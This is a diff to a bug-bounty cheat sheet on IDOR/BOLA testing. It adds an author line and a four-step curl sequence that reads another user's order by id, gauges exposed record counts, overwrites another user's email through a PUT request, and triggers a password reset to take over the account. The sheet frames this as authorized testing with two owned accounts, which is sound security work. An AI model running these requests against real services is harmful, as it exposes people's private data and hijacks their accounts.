@@ -1,5 +1,7 @@
 # IDOR / BOLA Attack Arsenal — Copy-Paste Payloads, ID-Mutation Matrix & Two-Account Workflow
 
+**Author:** x8bitranjit
+
 > Companion to `IDOR_TESTING_GUIDE.md`. **Pick by where the reference lives and what guards it** (guide §5/§8). Replace `<A_TOKEN>`/`<B_TOKEN>` (your two test accounts), `<B_ID>` (victim object/user id), `target.com`. **Authorized targets only; both accounts must be yours; prove the pattern with a SMALL set, never dump real PII** (guide §25).
 >
 > **Workflow:** two accounts A & B (§1) → map references (§3) → swap B's reference into A's request (§4) → if blocked, run the mutation matrix (§8) → escalate (read→enumerate→write→ATO→BFLA→RCE, §11–§17).
@@ -13,6 +15,24 @@ export A='Authorization: Bearer <A_TOKEN>'      # attacker (you)
 export B='Authorization: Bearer <B_TOKEN>'      # victim (also you)
 export BID=124                                   # an object/user id owned by B
 # (cookie auth: use  -H "Cookie: session=<A>"  instead of the bearer header)
+```
+
+## A0. The whole attack in one sequence (the shape of every paid IDOR — see Guide §4.4)
+*What & when:* the fastest way to hold the method in your head before diving into individual sections. Every IDOR that pays follows this arc — only the *reference* (id / `node(id:)` / child id / tenant key) and the *sink* change.
+```bash
+# 1) ORACLE (§4): A's creds + B's object id → B's data?
+curl -s "$T/api/orders/8001" -H "$A" | jq .        # 200 + B's order (owner≠A) = IDOR-READ ⭐
+#    (A's own data back = SAFE/session-scoped ; 403/404 = go to section H bypass matrix)
+
+# 2) SCALE from metadata, DON'T scrape (§6.5,§11): state the population, prove pattern with a handful
+curl -sI "$T/api/orders?limit=1" -H "$A" | grep -i 'x-total'      # e.g. X-Total-Count: 48213 = mass-PII
+
+# 3) FIND THE WRITE verb on B's object (§12), then VERIFY it landed as B (a 200 is NOT proof, §4.2):
+curl -s -X PUT "$T/api/users/8042" -H "$A" -d '{"email":"attacker+idor@inbox.test"}'
+curl -s "$T/api/users/8042" -H "$B" | jq '.email'   # B's own token shows attacker email = write stuck ⭐
+
+# 4) ATO (§12.1): point B's recovery email at your inbox → reset → log in as B. Then REVERT + STOP (§25).
+curl -s -X POST "$T/api/auth/forgot-password" -d '{"user":"b-poc@inbox.test"}'
 ```
 
 ## B. The core test — A's creds, B's object (guide §4)
